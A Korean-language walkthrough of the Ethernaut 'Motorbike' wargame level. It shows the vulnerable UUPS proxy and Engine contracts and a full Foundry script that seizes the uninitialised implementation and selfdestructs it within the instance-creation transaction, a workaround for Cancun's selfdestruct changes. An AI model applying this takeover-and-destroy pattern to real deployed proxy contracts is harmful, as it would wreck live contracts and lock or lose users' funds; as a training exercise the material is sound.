# 지문

Ethernaut의 모터바이크는 최신 업그레이드 가능한 엔진 설계를 가지고 있습니다.

당신은 이 엔진을 **selfdestruct**시켜서 모터바이크를 사용할 수 없게 만들 수 있을까요?

도움이 될 만한 것들:

* **EIP-1967**
* **UUPS 업그레이드 패턴**
* **Initializable 컨트랙트**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

# 풀이 

`Engine`(=implementation) contract의 code를 날리면되는 문제다.
문제자체는 쉽다.
`Engine`의 `initialize`함수를 호출함으로써 `upgrader`가 될 수 있고, `upgradeToAndCall` 함수를 통해 selfdestruct를 실행하는 contract의 코드를 delegatecall로 실행하면됨.

근데 cancun 업그레이드 이후에 selfdestruct를 해도 코드가 지워지지않으며, 코드를 지우려면 contract를 배포하는 tx안에 selfdestruct를 해야 코드가 지워짐.

문제는 instance를 생성하면 이미 contract를 배포하는 시점이 지나버리기 때문에 문제를 해결할 수가 없음.

그래서 편법이긴하지만, ethernaut 사이트에서 버튼을 눌러서 instance를 생성하는것 대신 instance를 생성하는 factory의 `createInstance`함수를 onchain에서 직접 호출하는 transaction안에 본인의 poc를 포함시키는 식으로 해결함 


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

interface IEthernaut {
    function createLevelInstance(address level) external payable;
    function submitInstance(address instance) external;
}
contract A {
    function destroy() public {
        selfdestruct(payable(tx.origin));
    }
}

contract Helper {
    address public level = 0x84eA74d481Ee0A5332c457a4d796187F6Ba67fEB;
    function trigger(address ethernaut, address newMortorInstance, address newEngineInstance) public {
        IEthernaut(ethernaut).createLevelInstance(level);
        ITarget target = ITarget(newEngineInstance);
        target.initialize();

        A a = new A();
        target.upgradeToAndCall(address(a), abi.encodeWithSignature("destroy()"));
    }
}

contract SolveScript is Script {
    address public target = 0xDa1A2E33BD9E8ae3641A61ab72f137e61A7edf6e;
    address public ethernaut = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address public level = 0x84eA74d481Ee0A5332c457a4d796187F6Ba67fEB;

    function setUp() public {}

    // forge script -vvvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("start");

        address EngineInstance = vm.computeCreateAddress(level, vm.getNonce(level));
        address MortorInstance = vm.computeCreateAddress(level, vm.getNonce(level)+1);

        console.log("EngineInstance address : %s", EngineInstance);
        console.log("MortorInstance address : %s", MortorInstance);
        console.log("EngineInstance code length : %d", address(EngineInstance).code.length);
        console.log("MortorInstance code length : %d", address(MortorInstance).code.length);
        Helper helper = new Helper();
        helper.trigger(ethernaut, MortorInstance, EngineInstance);

        console.log("EngineInstance code length : %d", address(EngineInstance).code.length);
        console.log("MortorInstance code length : %d", address(MortorInstance).code.length);
        
        
        vm.stopBroadcast();
    }
}
```